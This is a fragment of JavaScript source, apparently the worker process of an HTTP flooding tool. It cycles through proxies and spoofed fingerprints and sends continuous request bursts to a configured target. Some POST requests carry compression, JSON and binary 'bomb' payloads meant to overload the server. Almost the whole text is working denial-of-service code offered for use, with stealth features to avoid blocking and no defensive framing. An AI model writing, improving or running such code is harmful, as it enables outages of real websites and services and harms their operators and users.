                    this.isEstablishing = false;
                    this.startSpamming();
                    return;
                }
                attempts++;
                await sleep(25); // Faster proxy switch
            }
            
            await sleep(250);
            this.establishConnection();
        }

        async switchProxySilent() {
            const { proxies } = this.config;
            let attempts = 0;
            
            while (attempts < 3) {
                const nextIndex = Math.floor(Math.random() * proxies.length);
                this.proxy = proxies[nextIndex];
                this.agent = createPersistentAgent(this.proxy, this.config.target);
                
                const testResult = await this.testConnection();
                if (testResult) {
                    this.consecutiveErrors = 0;
                    this.isEstablishing = false;
                    return;
                }
                attempts++;
                await sleep(25);
            }
            
            if (proxies.length > 0) {
                this.proxy = proxies[0];
                this.agent = createPersistentAgent(this.proxy, this.config.target);
            }
        }

        async testConnection() {
            return new Promise((resolve) => {
                try {
                    const urlObj = new URL(this.config.target);
                    const httpModule = urlObj.protocol === 'https:' ? https : http;
                    const testFingerprint = RandomFingerprint.generate();

                    const options = {
                        hostname: urlObj.hostname,
                        port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
                        path: urlObj.pathname + (urlObj.search || ''),
                        method: 'HEAD',
                        headers: { 'User-Agent': testFingerprint.userAgent },
                        agent: this.agent,
                        timeout: 2000 // Faster timeout
                    };

                    const req = httpModule.request(options, res => {
                        res.resume();
                        resolve(res.statusCode < 500);
                    });

                    req.on('error', () => resolve(false));
                    req.on('timeout', () => {
                        req.destroy();
                        resolve(false);
                    });
                    req.end();
                } catch {
                    resolve(false);
                }
            });
        }

        async sendRequest(forcedMethod = null) {
            return new Promise((resolve) => {
                try {
                    const urlObj = new URL(this.config.target);
                    const httpModule = urlObj.protocol === 'https:' ? https : http;
                    const method = forcedMethod || randomMethod();
                    
                    const attackVector = AttackRotation.getRandomAttackVector();
                    const headers = stealthHeaders(method, attackVector);

                    let payload = null;
                    if (method === 'POST') {
                        switch (attackVector) {
                            case 'compression_bomb':
                                const magicBag = MagicBagFactory.createMagicBag('auto', stealthEngine.getCompressionLevel());
                                payload = magicBag.bagContents;
                                headers['Content-Type'] = this.getContentTypeForBag(magicBag.type);
                                if (magicBag.encoding === 'gzip') {
                                    headers['Content-Encoding'] = 'gzip';
                                }
                                headers['X-Magic-Bag-Type'] = magicBag.type;
                                headers['X-Explosion-Ratio'] = magicBag.explosionRatio.toString();
                                break;
                            case 'json_bomb':
                                payload = stealthEngine.generateAdaptiveJsonBomb();
                                headers['Content-Type'] = 'application/json';
                                break;
                            case 'binary_bomb':
                                payload = stealthEngine.generateExecutableBinary(8192); // Doubled size
                                headers['Content-Type'] = 'application/octet-stream';
                                break;
                            case 'mixed_payload':
                                payload = this.generateMixedPayload();
                                headers['Content-Type'] = 'application/octet-stream';
                                break;
                            case 'simple_payload':
                                payload = '{"test":"optimized_data"}'.repeat(10); // Increased repetition
                                headers['Content-Type'] = 'application/json';
                                break;
                            default:
                                payload = stealthEngine.generateAdaptiveJsonBomb();
                                headers['Content-Type'] = 'application/json';
                        }
                        
                        headers['Content-Length'] = Buffer.byteLength(payload);
                    }

                    const options = {
                        hostname: urlObj.hostname,
                        port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
                        path: urlObj.pathname + (urlObj.search || ''),
                        method: method,
                        headers: headers,
                        agent: this.agent,
                        timeout: 3000
                    };

                    const req = httpModule.request(options, res => {
                        const statusCode = res.statusCode;
                        
                        if (!this.config.burstMode && !(statusCode >= 400 && statusCode < 500)) {
                            this.localRequestCount++;
                            const proxyUsed = this.proxy || 'DIRECT';
                            
                            let statusText = 'SUCCESS';
                            if (statusCode >= 200 && statusCode < 300) statusText = 'SUCCESS';
                            else if (statusCode >= 300 && statusCode < 400) statusText = 'REDIRECT';
                            else if (statusCode >= 500) statusText = 'SERVER_ERR';

                            this.manager.reportResponse(
                                gradient.rainbow(`${statusText} : ${method} : ${statusCode} : [${proxyUsed}] : [W${this.config.workerId}T${this.socketId}:${this.localRequestCount}]`)
                            );
                        }

                        if (statusCode < 500) {
                            this.consecutiveErrors = 0;
                        } else {
                            this.consecutiveErrors++;
                            if (this.consecutiveErrors >= this.maxErrors) {
                                this.establishConnection();
                            }
                        }

                        res.resume();
                        resolve();
                    });

                    if (method === 'POST' && payload) {
                        if (Buffer.isBuffer(payload)) {
                            req.write(payload);
                        } else {
                            req.write(payload);
                        }
                    }

                    req.on('error', () => {
                        this.consecutiveErrors++;
                        if (this.consecutiveErrors >= this.maxErrors) {
                            this.establishConnection();
                        }
                        resolve();
                    });

                    req.on('timeout', () => {
                        req.destroy();
                        this.consecutiveErrors++;
                        if (this.consecutiveErrors >= this.maxErrors) {
                            this.establishConnection();
                        }
                        resolve();
                    });

                    req.end();
                } catch {
                    this.consecutiveErrors++;
                    if (this.consecutiveErrors >= this.maxErrors) {
                        this.establishConnection();
                    }
                    resolve();
                }
            });
        }

        generateMixedPayload() {
            const text = MagicBagFactory.createTextBomb('large').bagContents; // Increased size
            const json = MagicBagFactory.createJsonBomb('large').bagContents;
            const binary = MagicBagFactory.createBinaryBomb('large').bagContents;
            
            return Buffer.concat([text, json, binary]);
        }

        getContentTypeForBag(bagType) {
            switch (bagType) {
                case 'text_bomb':
                case 'simple_text':
                    return 'text/plain';
                case 'json_bomb':
                case 'simple_json':
                    return 'application/json';
                case 'xml_bomb':
                case 'simple_xml':
                    return 'application/xml';
                case 'binary_bomb':
                case 'simple_binary':
                    return 'application/octet-stream';
                case 'super_bomb':
                    return 'application/x-compressed';
                default:
                    return 'application/json';
            }
        }

        async startBurstMode() {
            const burstSize = this.config.burstSize || 100;
            
            while (true) {
                if (!this.config.noProxyMode && this.proxy) {
                    const proxyOk = await this.testConnection();
                    if (!proxyOk) {
                        await this.switchProxySilent();
                    }
                }

                const batch = [];
                for (let i = 1; i <= burstSize * 2; i++) { // Doubled burst size
                    if (!this.isEstablishing && i % 2 === 0) {
                        this.sendRequest().catch(() => {});
                    }
                    
                    batch.push(this.createPreparedRequest());
                    
                    await sleep(0.5); // Faster interval
                }

                const startTime = Date.now();
                await Promise.all(batch);
                const burstTime = Date.now() - startTime;
                
                const proxyInfo = this.proxy || 'DIRECT';
                
                console.log(
                    gradient.rainbow(`SUCCESS SEND ${burstSize * 2} REQUESTS TO SERVER [${burstTime}ms] [${proxyInfo}]`)
                );
                
                await sleep(this.config.delayMs);
            }
        }
        
        createPreparedRequest() {
            const method = randomMethod();
            const attackVector = AttackRotation.getRandomAttackVector();
            
            return async () => {
                return new Promise((resolve) => {
                    try {
                        const urlObj = new URL(this.config.target);
                        const httpModule = urlObj.protocol === 'https:' ? https : http;
                        const headers = stealthHeaders(method, attackVector);

                        let payload = null;
                        if (method === 'POST') {
                            switch (attackVector) {
                                case 'compression_bomb':
                                    const magicBag = MagicBagFactory.createMagicBag('auto', stealthEngine.getCompressionLevel());
                                    payload = magicBag.bagContents;
                                    headers['Content-Type'] = this.getContentTypeForBag(magicBag.type);
                                    if (magicBag.encoding === 'gzip') {
                                        headers['Content-Encoding'] = 'gzip';
                                    }
                                    break;
                                case 'json_bomb':
                                    payload = stealthEngine.generateAdaptiveJsonBomb();
                                    headers['Content-Type'] = 'application/json';
                                    break;
                                case 'binary_bomb':
                                    payload = stealthEngine.generateExecutableBinary(8192); // Doubled size
                                    headers['Content-Type'] = 'application/octet-stream';
                                    break;
                                case 'mixed_payload':
                                    payload = this.generateMixedPayload();
                                    headers['Content-Type'] = 'application/octet-stream';
                                    break;
                                default:
                                    payload = '{"test":"optimized_data"}'.repeat(10); // Increased repetition
                                    headers['Content-Type'] = 'application/json';
                            }
                            
                            if (payload) {
                                headers['Content-Length'] = Buffer.byteLength(payload);
                            }
                        }

                        const options = {
                            hostname: urlObj.hostname,
                            port: urlObj.port || (urlObj.protocol === 'https:' ? 443 : 80),
                            path: urlObj.pathname + (urlObj.search || ''),
                            method: method,
                            headers: headers,
                            agent: this.agent,
                            timeout: 2000 // Faster timeout
                        };

                        const req = httpModule.request(options, res => {
                            res.resume();
                            resolve();
                        });

                        if (method === 'POST' && payload) {
                            req.write(payload);
                        }

                        req.on('error', () => resolve());
                        req.on('timeout', () => {
                            req.destroy();
                            resolve();
                        });

                        req.end();
                    } catch {
                        resolve();
                    }
                });
            };
        }

        async startSpamming() {
            if (this.config.burstMode) {
                await this.startBurstMode();
            } else {
                while (true) {
                    if (!this.isEstablishing) {
                        await this.sendRequest();
                    }
                    await sleep(this.config.delayMs / 2); // Faster spam rate
                }
            }
        }
    }

    let stealthEngine = null;

    process.on('message', (message) => {
        if (message.type === 'init') {
            config = message.config;
            new SocketManager(config);
        }
    });
}